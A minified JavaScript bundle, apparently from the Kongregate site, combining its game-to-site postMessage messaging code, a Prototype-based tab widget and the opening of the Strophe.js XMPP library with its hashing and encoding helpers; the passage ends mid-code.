if(function(){var e;Kongregate.MessageConnection=function(e){this.initialize(e)},Kongregate.MessageConnection.MESSAGE_EVENT="kongregate:api:message",Kongregate.MessageConnection.prototype={initialize:function(t){e=t.channel_id,this._window=t.window||window,this._targetOrigin=t.target_origin,this._targetWindows=t.target_window?[t.target_window]:[],this._sendListener=t.send_listener,this._retryConnection=t.retry_connection||!1,this._messageListeners=[],this._supportsObjects=Kongregate.PostMessage.supportsObjects(),this._client="string"==typeof this._targetOrigin,this._connected=this._handleMessages=!1},addMessageListener:function(e){this._messageListeners.push(e)},isSupported:function(){return!(!this.supportsObjects()&&void 0===this._window.JSON)&&void 0!==(this._targetWindows[0]||window).postMessage},connected:function(){return this._connected},isClient:function(){return this._client},supportsObjects:function(){return this._supportsObjects},logPrefix:function(){return this._client?"[Game:JS]":"[Konduit]"},listen:function(){if(this.isSupported()&&!this._listening){this._listening=!0;var e=this;Kongregate.PostMessage.addMessageListener(this._window,(function(t){e.onMessageReceived.call(e,t)}))}},parseMessage:function(e){try{var t=Kongregate.PostMessage.parseMessage(e);if(t&&t.kongregate_type===Kongregate.MessageConnection.MESSAGE_EVENT)return{opcode:t.opcode,params:t.params}}catch(t){Kongregate.Log.warn(this.logPrefix(),"Error parsing message",e,t)}return null},onMessageReceived:function(e){var t=e.origin||e.originalEvent.origin;this._targetOrigin&&t!==this._targetOrigin?Kongregate.Log.debug(this.logPrefix(),"Ignoring message from "+t):(t=this.parseMessage(e.data))&&this.processMessage(t,e)},processMessage:function(e,t){switch(Kongregate.Log.debug(this.logPrefix(),"Message received:",e),e.opcode){case KonduitEvent.CONNECT:this.onClientConnected(e.params,t.source);break;case KonduitEvent.CONNECTED:this.onConnectedToServer()}for(t=0;t<this._messageListeners.length;t++)this._messageListeners[t](e.opcode,e.params)},sendMessage:function(e,t){if(this.removeMissingWindows(),this.connected()||e===KonduitEvent.CONNECT||e===KonduitEvent.CONNECTED){var i={kongregate_type:Kongregate.MessageConnection.MESSAGE_EVENT,opcode:e,params:"string"==typeof t?JSON.parse(t):t};this.supportsObjects()||(i=JSON.stringify(i));for(var n=this._targetOrigin||"*",s=0;s<this._targetWindows.length;s++)this._targetWindows[s].postMessage(i,n);this._sendListener&&this._sendListener(e,t)}else Kongregate.Log.debug(this.logPrefix(),"Not sending "+e+", not connected")},connect:function(){this.connected()||(this.listen(),Kongregate.Log.debug("Attempting to connect to Kongregate API"),this.sendMessage(KonduitEvent.CONNECT,{chnl:e}),this._retryConnection&&this.retryConnection())},retryConnection:function(){var e=this;setTimeout((function(){e.connect()}),5e3)},onClientConnected:function(t,i){t.chnl!==e?Kongregate.Log.warn(this.logPrefix(),"Channel ID mismatch, ignoring connect"):(Kongregate.Log.debug(this.logPrefix(),"API connection established!"),this.acceptClientConnection(i))},onConnectedToServer:function(){this.connected()||(Kongregate.Log.debug(this.logPrefix(),"API connection established!"),this._connected=!0)},acceptClientConnection:function(e){for(var t=!1,i=this._targetWindows,n=0;n<this._targetWindows.length;n++)if(this._targetWindows[n]===e){Kongregate.Log.warn("Re-initializing duplicate connection"),t=!0;break}this._targetWindows=[e],this.sendMessage(KonduitEvent.CONNECTED,{}),this._targetWindows=i,t||this._targetWindows.push(e),this.removeMissingWindows()},removeMissingWindows:function(e){if(!this._client){for(i=this._targetWindows.length-1;0<=i;i--)this._targetWindows[i].top||this._targetWindows.splice(i,1);this._connected=0<this._targetWindows.length}}}}(),Kongregate.PostMessage={addMessageListener:function(e,t){if(e.document.addEventListener)try{e.document.addEventListener.call(e,"message",t,!1)}catch(i){Kongregate.Log.debug("addEventListener failed, using iframe addEventListener: "+i),Kongregate.PostMessage.createIframeEventListener(e,t)}else e.attachEvent?e.attachEvent("onmessage",t):Kongregate.Log.error("Could not add event listener, neither addEventListener or attachEvent found!");return t},removeMessageListener:function(e,t){e.removeEventListener?e.removeEventListener("message",t):e.detachEvent&&e.detachEvent("onmessage",t)},supportsObjects:function(){var e=document.createElement("iframe"),t=!0;e.src="about:blank",document.body.appendChild(e);try{e.contentWindow.postMessage({toString:function(){return t=!1,""}},"*")}catch(e){}return document.body.removeChild(e),t},parseMessage:function(e){return"string"==typeof e&&"{"===e.charAt(0)?JSON.parse(e):"object"==typeof e?e:null},createIframeEventListener:function(e,t){var i=document.createElement("iframe");i.src="about:blank",document.head.appendChild(i),i.contentWindow.addEventListener.call(e,"message",t,!1),document.head.removeChild(i)}},"undefined"==typeof Prototype)throw"Control.Tabs requires Prototype to be loaded.";if(void 0===Object.Event)throw"Control.Tabs requires Object.Event to be loaded.";Control.Tabs=Class.create({initialize:function(e,t){if(!$(e))throw"Control.Tabs could not find the element: "+e;this.activeLink=this.activeContainer=!1,this.containers=$H({}),this.links=[],Control.Tabs.instances.push(this),this.options={beforeChange:Prototype.emptyFunction,afterChange:Prototype.emptyFunction,hover:!1,linkSelector:"li a",setClassOnContainer:!1,activeClassName:"active",defaultTab:"first",autoLinkExternal:!0,targetRegExp:/#(.+)$/,showFunction:Element.show,hideFunction:Element.hide},Object.extend(this.options,t||{}),(this.options.linkSelector,$(e).select(this.options.linkSelector)).findAll((function(e){return/^#/.exec((Prototype.Browser.WebKit?decodeURIComponent(e.href):e.href).replace((Prototype.Browser.WebKit?decodeURIComponent(window.location.href):window.location.href).split("#")[0],""))})).each(function(e){this.addTab(e)}.bind(this)),this.containers.values().each(Element.hide),"first"==this.options.defaultTab?this.setActiveTab(this.links.first()):"last"==this.options.defaultTab?this.setActiveTab(this.links.last()):this.setActiveTab(this.options.defaultTab),(e=this.options.targetRegExp.exec(window.location))&&e[1]&&e[1].split(",").each(function(e){this.setActiveTab(this.links.find((function(t){return t.key==e})))}.bind(this)),this.options.autoLinkExternal&&$A(document.getElementsByTagName("a")).each(function(e){if(!this.links.include(e)){var t=e.href.replace(window.location.href.split("#")[0],"");"#"==t.substring(0,1)&&this.containers.keys().include(t.substring(1))&&$(e).observe("click",function(e,t){this.setActiveTab(t.substring(1))}.bindAsEventListener(this,t))}}.bind(this))},addTab:function(e){this.links.push(e),e.key=e.getAttribute("href").replace(window.location.href.split("#")[0],"").split("/").last().replace(/#/,"");var t=$(e.key);if(!t)throw"Control.Tabs: #"+e.key+" was not found on the page.";this.containers.set(e.key,t),Event.observe(e,this.options.hover?"mouseover":"click",function(t){return Event.stop(t),this.setActiveTab(e),!1}.bind(this))},setActiveTab:function(e){(e||void 0!==e)&&("string"==typeof e?this.setActiveTab(this.links.find((function(t){return t.key==e}))):"number"==typeof e?this.setActiveTab(this.links[e]):!1!==this.notify("beforeChange",this.activeContainer,this.containers.get(e.key))&&(this.activeContainer&&this.options.hideFunction(this.activeContainer),this.links.each(function(e){(this.options.setClassOnContainer?$(e.parentNode):e).removeClassName(this.options.activeClassName)}.bind(this)),(this.options.setClassOnContainer?$(e.parentNode):e).addClassName(this.options.activeClassName),this.activeContainer=this.containers.get(e.key),this.activeLink=e,this.options.showFunction(this.containers.get(e.key)),this.notify("afterChange",this.containers.get(e.key))))},next:function(){this.links.each(function(e,t){if(this.activeLink==e&&this.links[t+1])throw this.setActiveTab(this.links[t+1]),$break}.bind(this))},previous:function(){this.links.each(function(e,t){if(this.activeLink==e&&this.links[t-1])throw this.setActiveTab(this.links[t-1]),$break}.bind(this))},first:function(){this.setActiveTab(this.links.first())},last:function(){this.setActiveTab(this.links.last())}}),Object.extend(Control.Tabs,{instances:[],findByTabId:function(e){return Control.Tabs.instances.find((function(t){return t.links.find((function(t){return t.key==e}))}))}}),Object.Event.extend(Control.Tabs),function(e){if(function(e,t){"function"==typeof define&&define.amd?define("strophe-base64",(function(){return t()})):e.Base64=t()}(this,(function(){return{encode:function(e){var t="",i=0;do{var n=e.charCodeAt(i++),s=e.charCodeAt(i++),o=e.charCodeAt(i++),a=n>>2,r=(3&n)<<4|s>>4,c=(15&s)<<2|o>>6,h=63&o;isNaN(s)?(r=(3&n)<<4,c=h=64):isNaN(o)&&(h=64),t=t+"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=".charAt(a)+"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=".charAt(r)+"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=".charAt(c)+"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=".charAt(h)}while(i<e.length);return t},decode:function(e){var t="",i=0;e=e.replace(/[^A-Za-z0-9\+\/=]/g,"");do{var n="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=".indexOf(e.charAt(i++)),s="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=".indexOf(e.charAt(i++)),o="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=".indexOf(e.charAt(i++)),a="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=".indexOf(e.charAt(i++));n=n<<2|s>>4,s=(15&s)<<4|o>>2;var r=(3&o)<<6|a;t+=String.fromCharCode(n),64!=o&&(t+=String.fromCharCode(s)),64!=a&&(t+=String.fromCharCode(r))}while(i<e.length);return t}}})),function(e,t){"function"==typeof define&&define.amd?define("strophe-sha1",(function(){return t()})):e.SHA1=t()}(this,(function(){function e(e,t){e[t>>5]|=128<<24-t%32,e[15+(t+64>>9<<4)]=t,t=Array(80);var n,s,o=1732584193,a=-271733879,r=-1732584194,c=271733878,h=-1009589776;for(n=0;n<e.length;n+=16){var d=o,u=a,l=r,_=c,m=h;for(s=0;80>s;s++){if(16>s)t[s]=e[n+s];else{var p=t[s-3]^t[s-8]^t[s-14]^t[s-16];t[s]=p<<1|p>>>31}p=i(i(p=o<<5|o>>>27,20>s?a&r|~a&c:40>s?a^r^c:60>s?a&r|a&c|r&c:a^r^c),i(i(h,t[s]),20>s?1518500249:40>s?1859775393:60>s?-1894007588:-899497514)),h=c,c=r,r=a<<30|a>>>2,a=o,o=p}o=i(o,d),a=i(a,u),r=i(r,l),c=i(c,_),h=i(h,m)}return[o,a,r,c,h]}function t(t,i){var s=n(t);16<s.length&&(s=e(s,8*t.length));var o=Array(16);t=Array(16);for(var a=0;16>a;a++)o[a]=909522486^s[a],t[a]=1549556828^s[a];return i=e(o.concat(n(i)),512+8*i.length),e(t.concat(i),672)}function i(e,t){var i=(65535&e)+(65535&t);return(e>>16)+(t>>16)+(i>>16)<<16|65535&i}function n(e){for(var t=[],i=0;i<8*e.length;i+=8)t[i>>5]|=(255&e.charCodeAt(i/8))<<24-i%32;return t}function s(e){for(var t="",i=0;i<32*e.length;i+=8)t+=String.fromCharCode(e[i>>5]>>>24-i%32&255);return t}function o(e){for(var t,i,n="",s=0;s<4*e.length;s+=3)for(t=(e[s>>2]>>8*(3-s%4)&255)<<16|(e[s+1>>2]>>8*(3-(s+1)%4)&255)<<8|e[s+2>>2]>>8*(3-(s+2)%4)&255,i=0;4>i;i++)n=8*s+6*i>32*e.length?n+"=":n+"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/".charAt(t>>6*(3-i)&63);return n}return{b64_hmac_sha1:function(e,i){return o(t(e,i))},b64_sha1:function(t){return o(e(n(t),8*t.length))},binb2str:s,core_hmac_sha1:t,str_hmac_sha1:function(e,i){return s(t(e,i))},str_sha1:function(t){return s(e(n(t),8*t.length))}}})),function(e,t){"function"==typeof define&&define.amd?define("strophe-md5",(function(){return t()})):e.MD5=t()}(this,(function(e){var t=function(e,t){var i=(65535&e)+(65535&t);return(e>>16)+(t>>16)+(i>>16)<<16|65535&i},i=function(e){for(var t=[],i=0;i<8*e.length;i+=8)t[i>>5]|=(255&e.charCodeAt(i/8))<<i%32;return t},n=function(e,i,n,s,o,a){return e=t(t(i,e),t(s,a)),t(e<<o|e>>>32-o,n)},s=function(e,t,i,s,o,a,r){return n(t&i|~t&s,e,t,o,a,r)},o=function(e,t,i,s,o,a,r){return n(t&s|i&~s,e,t,o,a,r)},a=function(e,t,i,s,o,a,r){return n(i^(t|~s),e,t,o,a,r)},r=function(e,i){e[i>>5]|=128<<i%32,e[14+(i+64>>>9<<4)]=i,i=1732584193;for(var r,c,h,d,u=-271733879,l=-1732584194,_=271733878,m=0;m<e.length;m+=16)r=i,c=u,h=l,d=_,i=s(i,u,l,_,e[m+0],7,-680876936),_=s(_,i,u,l,e[m+1],12,-389564586),l=s(l,_,i,u,e[m+2],17,606105819),u=s(u,l,_,i,e[m+3],22,-1044525330),i=s(i,u,l,_,e[m+4],7,-176418897),_=s(_,i,u,l,e[m+5],12,1200080426),l=s(l,_,i,u,e[m+6],17,-1473231341),u=s(u,l,_,i,e[m+7],22,-45705983),i=s(i,u,l,_,e[m+8],7,1770035416),_=s(_,i,u,l,e[m+9],12,-1958414417),l=s(l,_,i,u,e[m+10],17,-42063),u=s(u,l,_,i,e[m+11],22,-1990404162),i=s(i,u,l,_,e[m+12],7,1804603682),_=s(_,i,u,l,e[m+13],12,-40341101),l=s(l,_,i,u,e[m+14],17,-1502002290),u=s(u,l,_,i,e[m+15],22,1236535329),i=o(i,u,l,_,e[m+1],5,-165796510),_=o(_,i,u,l,e[m+6],9,-1069501632),l=o(l,_,i,u,e[m+11],14,643717713),u=o(u,l,_,i,e[m+0],20,-373897302),i=o(i,u,l,_,e[m+5],5,-701558691),_=o(_,i,u,l,e[m+10],9,38016083),l=o(l,_,i,u,e[m+15],14,-660478335),u=o(u,l,_,i,e[m+4],20,-405537848),i=o(i,u,l,_,e[m+9],5,568446438),_=o(_,i,u,l,e[m+14],9,-1019803690),l=o(l,_,i,u,e[m+3],14,-187363961),u=o(u,l,_,i,e[m+8],20,1163531501),i=o(i,u,l,_,e[m+13],5,-1444681467),_=o(_,i,u,l,e[m+2],9,-51403784),l=o(l,_,i,u,e[m+7],14,1735328473),u=o(u,l,_,i,e[m+12],20,-1926607734),i=n(u^l^_,i,u,e[m+5],4,-378558),_=n(i^u^l,_,i,e[m+8],11,-2022574463),l=n(_^i^u,l,_,e[m+11],16,1839030562),u=n(l^_^i,u,l,e[m+14],23,-35309556),i=n(u^l^_,i,u,e[m+1],4,-1530992060),_=n(i^u^l,_,i,e[m+4],11,1272893353),l=n(_^i^u,l,_,e[m+7],16,-155497632),u=n(l^_^i,u,l,e[m+10],23,-1094730640),i=n(u^l^_,i,u,e[m+13],4,681279174),_=n(i^u^l,_,i,e[m+0],11,-358537222),l=n(_^i^u,l,_,e[m+3],16,-722521979),u=n(l^_^i,u,l,e[m+6],23,76029189),i=n(u^l^_,i,u,e[m+9],4,-640364487),_=n(i^u^l,_,i,e[m+12],11,-421815835),l=n(_^i^u,l,_,e[m+15],16,530742520),u=n(l^_^i,u,l,e[m+2],23,-995338651),i=a(i,u,l,_,e[m+0],6,-198630844),_=a(_,i,u,l,e[m+7],10,1126891415),l=a(l,_,i,u,e[m+14],15,-1416354905),u=a(u,l,_,i,e[m+5],21,-57434055),i=a(i,u,l,_,e[m+12],6,1700485571),_=a(_,i,u,l,e[m+3],10,-1894986606),l=a(l,_,i,u,e[m+10],15,-1051523),u=a(u,l,_,i,e[m+1],21,-2054922799),i=a(i,u,l,_,e[m+8],6,1873313359),_=a(_,i,u,l,e[m+15],10,-30611744),l=a(l,_,i,u,e[m+6],15,-1560198380),u=a(u,l,_,i,e[m+13],21,1309151649),i=a(i,u,l,_,e[m+4],6,-145523070),_=a(_,i,u,l,e[m+11],10,-1120210379),l=a(l,_,i,u,e[m+2],15,718787259),u=a(u,l,_,i,e[m+9],21,-343485551),i=t(i,r),u=t(u,c),l=t(l,h),_=t(_,d);return[i,u,l,_]};return{hexdigest:function(e){e=r(i(e),8*e.length);for(var t="",n=0;n<4*e.length;n++)t+="0123456789abcdef".charAt(e[n>>2]>>n%4*8+4&15)+"0123456789abcdef".charAt(e[n>>2]>>n%4*8&15);return t},hash:function(e){e=r(i(e),8*e.length);for(var t="",n=0;n<32*e.length;n+=8)t+=String.fromCharCode(e[n>>5]>>>n%32&255);return t}}})),function(e,t){"function"==typeof define&&define.amd?define("strophe-utils",(function(){return t()})):e.stropheUtils=t()}(this,(function(){return{utf16to8:function(e){var t,i="",n=e.length;for(t=0;t<n;t++){var s=e.charCodeAt(t);0<=s&&127>=s?i+=e.charAt(t):(2047<s?(i+=String.fromCharCode(224|s>>12&15),i+=String.fromCharCode(128|s>>6&63)):i+=String.fromCharCode(192|s>>6&31),i+=String.fromCharCode(128|s>>0&63))}return i},addCookies:function(e){var t,i,n;for(t in e||{}){var s=n=i="",o=e[t],a="object"==typeof o,r=escape(unescape(a?o.value:o));a&&(i=o.expires?";expires="+o.expires:"",n=o.domain?";domain="+o.domain:"",s=o.path?";path="+o.path:""),document.cookie=t+"="+r+i+n+s}}}})),function(e,t){if("function"!=typeof define||!define.amd)return t();define("strophe-polyfill",[],(function(){return t()}))}(0,(function(){Function.prototype.bind||(Function.prototype.bind=function(e){var t=this,i=Array.prototype.slice,n=Array.prototype.concat,s=i.call(arguments,1);return function(){return t.apply(e||this,n.call(s,i.call(arguments,0)))}}),Array.isArray||(Array.isArray=function(e){return"[object Array]"===Object.prototype.toString.call(e)}),Array.prototype.indexOf||(Array.prototype.indexOf=function(e,t){var i=this.length;for(0>(t=0>(t=Number(t)||0)?Math.ceil(t):Math.floor(t))&&(t+=i);t<i;t++)if(t in this&&this[t]===e)return t;return-1})})),Array.prototype.forEach||(Array.prototype.forEach=function(e,t){var i,n;if(null===this)throw new TypeError(" this is null or not defined");var s=Object(this),o=s.length>>>0;if("function"!=typeof e)throw new TypeError(e+" is not a function");for(1<arguments.length&&(i=t),n=0;n<o;){if(n in s){var a=s[n];e.call(i,a,n,s)}n++}}),function(e,t){"function"==typeof define&&define.amd?define("strophe-core",["strophe-sha1","strophe-base64","strophe-md5","strophe-utils","strophe-polyfill"],(function(){return t.apply(this,arguments)})):(e=t(e.SHA1,e.Base64,e.MD5,e.stropheUtils),window.Strophe=e.Strophe,window.$build=e.$build,window.$iq=e.$iq,window.$msg=e.$msg,window.$pres=e.$pres,window.SHA1=e.SHA1,window.Base64=e.Base64,window.MD5=e.MD5,window.b64_hmac_sha1=e.SHA1.b64_hmac_sha1,window.b64_sha1=e.SHA1.b64_sha1,window.str_hmac_sha1=e.SHA1.str_hmac_sha1,window.str_sha1=e.SHA1.str_sha1)}(this,(function(e,t,i,n){function s(e,t){return new r.Builder(e,t)}function o(e){return new r.Builder("iq",e)}function a(e){return new r.Builder("presence",e)}var r={VERSION:"1.2.12",NS:{HTTPBIND:"http://jabber.org/protocol/httpbind",BOSH:"urn:xmpp:xbosh",CLIENT:"jabber:client",AUTH:"jabber:iq:auth",ROSTER:"jabber:iq:roster",PROFILE:"jabber:iq:profile",DISCO_INFO:"http://jabber.org/protocol/disco#info",DISCO_ITEMS:"http://jabber.org/protocol/disco#items",MUC:"http://jabber.org/protocol/muc",SASL:"urn:ietf:params:xml:ns:xmpp-sasl",STREAM:"http://etherx.jabber.org/streams",FRAMING:"urn:ietf:params:xml:ns:xmpp-framing",BIND:"urn:ietf:params:xml:ns:xmpp-bind",SESSION:"urn:ietf:params:xml:ns:xmpp-session",VERSION:"jabber:iq:version",STANZAS:"urn:ietf:params:xml:ns:xmpp-stanzas",XHTML_IM:"http://jabber.org/protocol/xhtml-im",XHTML:"http://www.w3.org/1999/xhtml"},XHTML:{tags:"a blockquote br cite em img li ol p span strong ul body".split(" "),attributes:{a:["href"],blockquote:["style"],br:[],cite:["style"],em:[],img:["src","alt","style","height","width"],li:["style"],ol:["style"],p:["style"],span:["style"],strong:[],ul:["style"],body:[]},css:"background-color color font-family font-size font-style font-weight margin-left margin-right text-align text-decoration".split(" "),validTag:function(e){for(var t=0;t<r.XHTML.tags.length;t++)if(e==r.XHTML.tags[t])return!0;return!1},validAttribute:function(e,t){if(void 0!==r.XHTML.attributes[e]&&0<r.XHTML.attributes[e].length)for(var i=0;i<r.XHTML.attributes[e].length;i++)if(t==r.XHTML.attributes[e][i])return!0;return!1},validCSS:function(e){for(var t=0;t<r.XHTML.css.length;t++)if(e==r.XHTML.css[t])return!0;return!1}},Status:{ERROR:0,CONNECTING:1,CONNFAIL:2,AUTHENTICATING:3,AUTHFAIL:4,CONNECTED:5,DISCONNECTED:6,DISCONNECTING:7,ATTACHED:8,REDIRECT:9,CONNTIMEOUT:10},LogLevel:{DEBUG:0,INFO:1,WARN:2,ERROR:3,FATAL:4},ElementType:{NORMAL:1,TEXT:3,CDATA:4,FRAGMENT:11},TIMEOUT:1.1,SECONDARY_TIMEOUT:.1,addNamespace:function(e,t){r.NS[e]=t},forEachChild:function(e,t,i){var n;for(n=0;n<e.childNodes.length;n++){var s=e.childNodes[n];s.nodeType!=r.ElementType.NORMAL||t&&!this.isTagEqual(s,t)||i(s)}},isTagEqual:function(e,t){return e.tagName==t},_xmlGenerator:null,_makeGenerator:function(){if(void 0===document.implementation.createDocument||document.implementation.createDocument&&document.documentMode&&10>document.documentMode){var e=this._getIEXmlDom();e.appendChild(e.createElement("strophe"))}else e=document.implementation.createDocument("jabber:client","strophe",null);return e},xmlGenerator:function(){return r._xmlGenerator||(r._xmlGenerator=r._makeGenerator()),r._xmlGenerator},_getIEXmlDom:function(){for(var e=null,t="Msxml2.DOMDocument.6.0 Msxml2.DOMDocument.5.0 Msxml2.DOMDocument.4.0 MSXML2.DOMDocument.3.0 MSXML2.DOMDocument MSXML.DOMDocument Microsoft.XMLDOM".split(" "),i=0;i<t.length&&null===e;i++)try{e=new ActiveXObject(t[i])}catch(t){e=null}return e},xmlElement:function(e){if(!e)return null;var t,i,n,s=r.xmlGenerator().createElement(e);for(t=1;t<arguments.length;t++){var o=arguments[t];if(o)if("string"==typeof o||"number"==typeof o)s.appendChild(r.xmlTextNode(o));else if("object"==typeof o&&"function"==typeof o.sort)for(i=0;i<o.length;i++){var a=o[i];"object"==typeof a&&"function"==typeof a.sort&&void 0!==a[1]&&null!==a[1]&&s.setAttribute(a[0],a[1])}else if("object"==typeof o)for(n in o)o.hasOwnProperty(n)&&void 0!==o[n]&&null!==o[n]&&s.setAttribute(n,o[n])}return s},xmlescape:function(e){return(e=(e=(e=(e=e.replace(/&/g,"&amp;")).replace(/</g,"&lt;")).replace(/>/g,"&gt;")).replace(/'/g,"&apos;")).replace(/"/g,"&quot;")},xmlunescape:function(e){return(e=(e=(e=(e=e.replace(/&amp;/g,"&")).replace(/&lt;/g,"<")).replace(/&gt;/g,">")).replace(/&apos;/g,"'")).replace(/&quot;/g,'"')},xmlTextNode:function(e){return r.xmlGenerator().createTextNode(e)},xmlHtmlNode:function(e){if(window.DOMParser)var t=(new DOMParser).parseFromString(e,"text/xml");else(t=new ActiveXObject("Microsoft.XMLDOM")).async="false",t.loadXML(e);return t},getText:function(e){if(!e)return null;var t="";0===e.childNodes.length&&e.nodeType==r.ElementType.TEXT&&(t+=e.nodeValue);for(var i=0;i<e.childNodes.length;i++)e.childNodes[i].nodeType==r.ElementType.TEXT&&(t+=e.childNodes[i].nodeValue);return r.xmlescape(t)},copyElement:function(e){var t;if(e.nodeType==r.ElementType.NORMAL){var i=r.xmlElement(e.tagName);for(t=0;t<e.attributes.length;t++)i.setAttribute(e.attributes[t].nodeName,e.attributes[t].value);for(t=0;t<e.childNodes.length;t++)i.appendChild(r.copyElement(e.childNodes[t]))}else e.nodeType==r.ElementType.TEXT&&(i=r.xmlGenerator().createTextNode(e.nodeValue));return i},createHtml:function(e){var t,i;if(e.nodeType==r.ElementType.NORMAL){var n=e.nodeName.toLowerCase();if(r.XHTML.validTag(n))try{var s=r.xmlElement(n);for(t=0;t<r.XHTML.attributes[n].length;t++){var o=r.XHTML.attributes[n][t],a=e.getAttribute(o);if(null!=a&&""!==a&&!1!==a&&0!==a)if("style"==o&&"object"==typeof a&&void 0!==a.cssText&&(a=a.cssText),"style"==o){var c=[],h=a.split(";");for(i=0;i<h.length;i++){var d=h[i].split(":"),u=d[0].replace(/^\s*/,"").replace(/\s*$/,"").toLowerCase();if(r.XHTML.validCSS(u)){var l=d[1].replace(/^\s*/,"").replace(/\s*$/,"");c.push(u+": "+l)}}0<c.length&&(a=c.join("; "),s.setAttribute(o,a))}else s.setAttribute(o,a)}for(t=0;t<e.childNodes.length;t++)s.appendChild(r.createHtml(e.childNodes[t]))}catch(e){s=r.xmlTextNode("")}else for(s=r.xmlGenerator().createDocumentFragment(),t=0;t<e.childNodes.length;t++)s.appendChild(r.createHtml(e.childNodes[t]))}else if(e.nodeType==r.ElementType.FRAGMENT)for(s=r.xmlGenerator().createDocumentFragment(),t=0;t<e.childNodes.length;t++)s.appendChild(r.createHtml(e.childNodes[t]));else e.nodeType==r.ElementType.TEXT&&(s=r.xmlTextNode(e.nodeValue));return s},escapeNode:function(e){return"string"!=typeof e?e:e.replace(/^\s+|\s+$/g,"").replace(/\\/g,"\\5c").replace(/ /g,"\\20").replace(/"/g,"\\22").replace(/&/g,"\\26").replace(/'/g,"\\27").replace(/\//g,"\\2f").replace(/:/g,"\\3a").replace(/</g,"\\3c").replace(/>/g,"\\3e").replace(/@/g,"\\40")},unescapeNode:function(e){return"string"!=typeof e?e:e.replace(/\\20/g," ").replace(/\\22/g,'"').replace(/\\26/g,"&").replace(/\\27/g,"'").replace(/\\2f/g,"/").replace(/\\3a/g,":").replace(/\\3c/g,"<").replace(/\\3e/g,">").replace(/\\40/g,"@").replace(/\\5c/g,"\\")},getNodeFromJid:function(e){return 0>e.indexOf("@")?null:e.split("@")[0]},getDomainFromJid:function(e){return 0>(e=r.getBareJidFromJid(e)).indexOf("@")?e:((e=e.split("@")).splice(0,1),e.join("@"))},getResourceFromJid:function(e){return 2>(e=e.split("/")).length?null:(e.splice(0,1),e.join("/"))},getBareJidFromJid:function(e){return e?e.split("/")[0]:null},_handleError:function(e){void 0!==e.stack&&r.fatal(e.stack),e.sourceURL?r.fatal("error: "+this.handler+" "+e.sourceURL+":"+e.line+" - "+e.name+": "+e.message):e.fileName?r.fatal("error: "+this.handler+" "+e.fileName+":"+e.lineNumber+" - "+e.name+": "+e.message):r.fatal("error: "+e.message)},log:function(e,t){},debug:function(e){this.log(this.LogLevel.DEBUG,e)},info:function(e){this.log(this.LogLevel.INFO,e)},warn:function(e){this.log(this.LogLevel.WARN,e)},error:function(e){this.log(this.LogLevel.ERROR,e)},fatal:function(e){this.log(this.LogLevel.FATAL,e)},serialize:function(e){if(!e)return null;"function"==typeof e.tree&&(e=e.tree());var t,i=e.nodeName;e.getAttribute("_realname")&&(i=e.getAttribute("_realname"));var n="<"+i;for(t=0;t<e.attributes.length;t++)"_realname"!=e.attributes[t].nodeName&&(n+=" "+e.attributes[t].nodeName+"='"+r.xmlescape(e.attributes[t].value)+"'");if(0<e.childNodes.length){for(n+=">",t=0;t<e.childNodes.length;t++){var s=e.childNodes[t];switch(s.nodeType){case r.ElementType.NORMAL:n+=r.serialize(s);break;case r.ElementType.TEXT:n+=r.xmlescape(s.nodeValue);break;case r.ElementType.CDATA:n+="<![CDATA["+s.nodeValue+"]]>"}}n+="</"+i+">"}else n+="/>";return n},_requestId:0,_connectionPlugins:{},addConnectionPlugin:function(e,t){r._connectionPlugins[e]=t},Builder:function(e,t){"presence"!=e&&"message"!=e&&"iq"!=e||(t&&!t.xmlns?t.xmlns=r.NS.CLIENT:t||(t={xmlns:r.NS.CLIENT})),this.node=this.nodeTree=r.xmlElement(e,t)}};return r.Builder.prototype={tree:function(){return this.nodeTree},toString:function(){return r.serialize(this.nodeTree)},up:function(){return this.node=this.node.parentNode,this},root:function(){return this.node=this.nodeTree,this},attrs:function(e){for(var t in e)e.hasOwnProperty(t)&&(void 0===e[t]?this.node.removeAttribute(t):this.node.setAttribute(t,e[t]));return this},c:function(e,t,i){return e=r.xmlElement(e,t,i),this.node.appendChild(e),"string"!=typeof i&&"number"!=typeof i&&(this.node=e),this},cnode:function(e){var t=r.xmlGenerator();try{var i=void 0!==t.importNode}catch(e){i=!1}return e=i?t.importNode(e,!0):r.copyElement(e),this.node.appendChild(e),this.node=e,this},t:function(e){return e=r.xmlTextNode(e),this.node.appendChild(e),this},h:function(e){var t=document.createElement("body");for(t.innerHTML=e,e=r.createHtml(t);0<e.childNodes.length;)this.node.appendChild(e.childNodes[0]);return this}},r.Handler=function(e,t,i,n,s,o,a){this.handler=e,this.ns=t,this.name=i,this.type=n,this.id=s,this.options=a||{matchBareFromJid:!1,ignoreNamespaceFragment:!1},this.options.matchBare&&(r.warn('The "matchBare" option is deprecated, use "matchBareFromJid" instead.'),this.options.matchBareFromJid=this.options.matchBare,delete this.options.matchBare),this.from=this.options.matchBareFromJid?o?r.getBareJidFromJid(o):null:o,this.user=!0},r.Handler.prototype={getNamespace:function(e){return(e=e.getAttribute("xmlns"))&&this.options.ignoreNamespaceFragment&&(e=e.split("#")[0]),e},namespaceMatch:function(e){var t=!1;if(!this.ns)return!0;var i=this;return r.forEachChild(e,null,(function(e){i.getNamespace(e)===i.ns&&(t=!0)})),t=t||this.getNamespace(e)===this.ns},isMatch:function(e){var t=e.getAttribute("from");this.options.matchBareFromJid&&(t=r.getBareJidFromJid(t));var i=e.getAttribute("type");return!(!this.namespaceMatch(e)||this.name&&!r.isTagEqual(e,this.name)||this.type&&(Array.isArray(this.type)?-1==this.type.indexOf(i):i!=this.type)||this.id&&e.getAttribute("id")!=this.id||this.from&&t!=this.from)},run:function(e){var t=null;try{t=this.handler(e)}catch(e){throw r._handleError(e),e}return t},toString:function(){return"{Handler: 